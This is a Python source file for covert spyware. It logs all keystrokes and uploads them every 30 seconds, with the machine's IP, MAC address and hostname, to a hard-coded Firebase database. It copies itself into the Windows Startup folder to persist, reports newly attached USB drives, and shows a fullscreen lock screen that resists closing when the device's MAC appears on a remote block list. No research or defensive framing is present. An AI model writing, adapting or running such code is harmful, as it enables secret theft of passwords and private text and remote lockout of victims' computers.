import os
import sys
import firebase_admin
from firebase_admin import credentials, db
import tkinter as tk
from threading import Thread, Timer
import time
from getmac import get_mac_address as gma
import socket
import psutil
from datetime import datetime
import shutil
import keyboard  # Import the keyboard module

# Determine if the script is running in a bundled executable
if getattr(sys, 'frozen', False):
    application_path = sys._MEIPASS
    executable_path = sys.executable  # Path to the executable
else:
    application_path = os.path.dirname(os.path.abspath(__file__))
    executable_path = os.path.abspath(__file__)  # Path to the script

cred_path = os.path.join(application_path, 'credentials.json')

# Firebase initialization
cred = credentials.Certificate(cred_path)
firebase_admin.initialize_app(cred, {
    'databaseURL': 'https://login-with-firebase-c38d2-default-rtdb.firebaseio.com/'
})

ref_log = db.reference("log")
ref_block = db.reference("block")

SEND_REPORT_EVERY = 30

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_db(self):
        mac_address = gma()
        host = socket.gethostname()
        ip = socket.gethostbyname(host)
        start_time = self.start_dt.strftime("%H:%M:%S")
        start_date = str(self.start_dt.date())
        end_time = self.end_dt.strftime("%H:%M:%S")
        end_date = str(self.end_dt.date())
        data = {
            'ip': ip,
            'mac': mac_address,
            'host_name': host,
            'keystrokes': self.log,
            'start_date': start_date,
            'start_time': start_time,
            'end_date': end_date,
            'end_time': end_time
        }
        success = False
        while not success:
            try:
                ref_log.push(data)
                success = True
            except Exception as e:
                print(f"Error reporting to database: {e}. Retrying in 5 seconds...")
                time.sleep(5)

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            self.report_to_db()
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()

class BlockScreen(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Blocked")
        self.attributes('-fullscreen', True)
        self.configure(bg='black')
        self.overrideredirect(True)
        self.wm_attributes("-topmost", True)

        label = tk.Label(self, text="You are blocked!", fg="red", bg="black", font=("Helvetica", 32))
        label.pack(expand=True)

        self.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.bind("<Escape>", self.on_closing)
        self.bind("<Alt-Return>", lambda e: "break")
        self.bind("<Alt-Tab>", lambda e: "break")

        self.lift()
        self.after(100, self.keep_on_top)

    def on_closing(self, event=None):
        pass

    def keep_on_top(self):
        self.lift()
        self.attributes('-topmost', True)
        self.after(100, self.keep_on_top)

def monitor_database():
    def check_database():
        success = False
        while not success:
            try:
                blocked_macs = ref_block.get()
                macs_in_db = []

                if isinstance(blocked_macs, dict):
                    for key, value in blocked_macs.items():
                        if isinstance(value, dict):
                            macs_in_db.extend(value.keys())
                        else:
                            macs_in_db.append(value)
                elif blocked_macs:
                    macs_in_db = list(blocked_macs)

                if mac_address in macs_in_db:
                    block_screen.after(0, show_block_screen)
                else:
                    block_screen.after(0, hide_block_screen)

                success = True
            except Exception as e:
                print(f"Error checking database: {e}. Retrying in 5 seconds...")
                time.sleep(5)

    while True:
        check_database()
        time.sleep(1)  # Check every second

def show_block_screen():
    if not block_screen.winfo_ismapped():
        block_screen.deiconify()

def hide_block_screen():
    if block_screen.winfo_ismapped():
        block_screen.withdraw()

def get_removable_disk_info():
    disk_info = []
    mac_address = gma()
    host = socket.gethostname()
    ip = socket.gethostbyname(host)
    partitions = psutil.disk_partitions()
    for partition in partitions:
        if 'removable' in partition.opts:
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                disk_info.append({
                    "device": partition.device,
                    "mountpoint": partition.mountpoint,
                    "fstype": partition.fstype,
                    "total": round(usage.total / (1024 ** 3), 2),
                    "used": round(usage.used / (1024 ** 3), 2),
                    "free": round(usage.free / (1024 ** 3), 2),
                    "percent": usage.percent,
                    "ip": ip,
                    "mac": mac_address,
                    "time": datetime.now().strftime("%H:%M:%S"),
                    "date": datetime.now().strftime("%Y-%m-%d")
                })
            except PermissionError as e:
                print(f"PermissionError: {e} - Skipping {partition.mountpoint}")
            except Exception as e:
                print(f"An error occurred: {e} - Skipping {partition.mountpoint}")
    return disk_info

def is_connected():
    try:
        socket.create_connection(("8.8.8.8", 53))
        return True
    except OSError:
        return False

if __name__ == "__main__":
    try:
        # Copy the executable to the startup folder
        a = os.getlogin()
        startup_folder = f'C:/Users/{a}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
        shutil.copy2(executable_path, startup_folder)  # Use shutil.copy2 to ensure proper copying
    except Exception as e:
        print(f"Error copying to startup folder: {e}")

    mac_address = gma()
    block_screen = BlockScreen()
    block_screen.withdraw()

    monitor_thread = Thread(target=monitor_database, daemon=True)
    monitor_thread.start()

    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger_thread = Thread(target=keylogger.start, daemon=True)
    keylogger_thread.start()

    current_disks = set()

    def monitor_disks():
        while True:
            new_disks = set(disk['device'] for disk in get_removable_disk_info())
            new_connections = new_disks - current_disks

            if new_connections:
                print(f"New removable disks detected: {new_connections}")
                new_disk_info = [disk for disk in get_removable_disk_info() if disk['device'] in new_connections]

                while not is_connected():
                    print("No internet connection. Waiting to send data...")
                    time.sleep(5)

                for disk in new_disk_info:
                    db.reference('disk').push(disk)

                print("New removable disk information sent to Firebase successfully.")

            current_disks.update(new_disks)
            time.sleep(10)

    disk_thread = Thread(target=monitor_disks, daemon=True)
    disk_thread.start()

    block_screen.mainloop()
